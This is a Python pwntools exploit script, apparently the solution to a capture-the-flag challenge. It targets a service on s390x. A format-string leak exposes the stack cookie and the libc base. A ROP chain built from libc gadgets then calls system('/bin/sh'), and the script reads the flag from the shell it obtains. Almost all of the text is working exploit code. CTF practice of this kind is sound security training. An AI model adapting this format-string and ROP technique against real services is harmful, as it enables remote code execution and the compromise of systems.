#!/usr/bin/env python3
from pwn import *

# main() stack layout:
# %r15 +   0 - Register save area for callees
# %r15 + 160 - lb.buf     | __snprintf_chk ...[0]
# %r15 + 168 - lb.current
# %r15 + 176 - lb.newline
# %r15 + 184 - lb.next
# %r15 + 192 - lb.end
# %r15 + 200 - in_buf
# %r15 + 328 - out_buf
# %r15 + 456 - cookie
# %r15 + 464 <- %r15@entry
# %r15 + 576 - r14
# %r15 + 584 - r15
arg0_off = 160
lb_buf_off = 160
in_buf_off = 200
cookie_off = 456
r15_entry_off = 464
r14_off = 576
r15_off = 584

lb_buf_skip = ((lb_buf_off - arg0_off) // 8)
lb_buf_marker = b'xx'
cookie_skip = ((cookie_off - lb_buf_off - 8) // 8)
cookie_marker = b'yy'
r14_skip = ((r14_off - cookie_off - 8) // 8)
r14_marker = b'zz'
fmt = (b'%c' * lb_buf_skip +
       lb_buf_marker + b'%016lx' +
       b'%c' * cookie_skip +
       cookie_marker + b'%016lx' +
       b'%c' * r14_skip +
       r14_marker + b'%016lx')

r14_libc_off = 0x24214  # __libc_start_main@@GLIBC_2.2
system_libc_off = 0x4ba10  # __libc_system@@GLIBC_PRIVATE
bin_sh_libc_off = 0x163b64  # "/bin/sh\0"
#    24a98:       e3 40 f1 20 00 04       lg      %r4,288(%r15)
#    24a9e:       e3 20 f0 a8 00 04       lg      %r2,168(%r15)
#    24aa4:       eb 6f f0 e0 00 04       lmg     %r6,%r15,224(%r15)
#    24aaa:       07 f4                   br      %r4
gadget_off = 0x24a98
gadget_ret_off = 288
gadget_r2_off = 168
gadget_r15_off = 224 + (15 - 6) * 8

control_chars = [b'\x04', b'\x0d', b'\x15', b'\x7f']  # b'\x0a' is ok


def try_once():
    p = remote(args['HOST'] or 'localhost', 1947)
    try:
        p.recvuntil('What\'s your name?')
        p.sendline(fmt)
        p.recvline()
        reply = p.recvuntil(', you')
        lb_buf_off = reply.index(lb_buf_marker) + len(lb_buf_marker)
        lb_buf = int(reply[lb_buf_off:lb_buf_off + 16], 16)
        cookie_reply_off = reply.index(cookie_marker) + len(cookie_marker)
        cookie = int(reply[cookie_reply_off:cookie_reply_off + 16], 16)
        r14_reply_off = reply.index(r14_marker) + len(r14_marker)
        r14 = int(reply[r14_reply_off:r14_reply_off + 16], 16)
        log.info('lb.buf    = 0x%016x', lb_buf)
        log.info('cookie    = 0x%016x', cookie)
        log.info('r14       = 0x%016x', r14)
        libc = r14 - r14_libc_off
        system_libc = libc + system_libc_off
        bin_sh_libc = libc + bin_sh_libc_off
        gadget = libc + gadget_off
        r15_entry = lb_buf - in_buf_off + r15_entry_off
        log.info('libc      = 0x%016x', libc)
        log.info('system    = 0x%016x', system_libc)
        log.info('bin_sh    = 0x%016x', bin_sh_libc)
        log.info('gadget    = 0x%016x', gadget)
        log.info('r15@entry = 0x%016x', r15_entry)
        rop_qwords = (r15_entry_off - in_buf_off + gadget_r15_off + 8) // 8
        rop = [b'!' * 8] * rop_qwords
        rop[(cookie_off - in_buf_off) // 8] = struct.pack('>Q', cookie)
        rop[(r15_off - in_buf_off) // 8] = struct.pack('>Q', r15_entry)
        rop[(r14_off - in_buf_off) // 8] = struct.pack('>Q', gadget)
        rop[(r15_entry_off - in_buf_off + gadget_r2_off) // 8] = \
            struct.pack('>Q', bin_sh_libc)
        rop[(r15_entry_off - in_buf_off + gadget_r15_off) // 8] = \
            struct.pack('>Q', r15_entry)
        rop[(r15_entry_off - in_buf_off + gadget_ret_off) // 8] = \
            struct.pack('>Q', system_libc)
        rop_bytes = b''.join(rop)
        orig_rop_len = len(rop_bytes)
        rop_bytes += b'!' * ((len(rop_bytes) + 9) // 10 - 1) + b'\n'
        for control_char in control_chars:
            if control_char in rop_bytes:
                log.info(
                    'Special character 0x%02x in ROP chain',
                    ord(control_char))
                return None
        p.sendline('HELL YEAH')
        p.recvuntil('How many bytes can you ROP?')
        p.sendline(str(orig_rop_len))
        p.recvuntil('You\'ll have to give me 110%!')
        p.send(rop_bytes)
        p.recvuntil('$ ')
        p.sendline('cat flag')
        p.recvline()  # echo
        return p.recvline().decode().strip()
    finally:
        p.close()


for _ in range(3):
    flag = try_once()
    if flag is not None:
        log.info('flag      = %s', flag)
        break
else:
    log.info('The solution is broken')
    sys.exit(1)
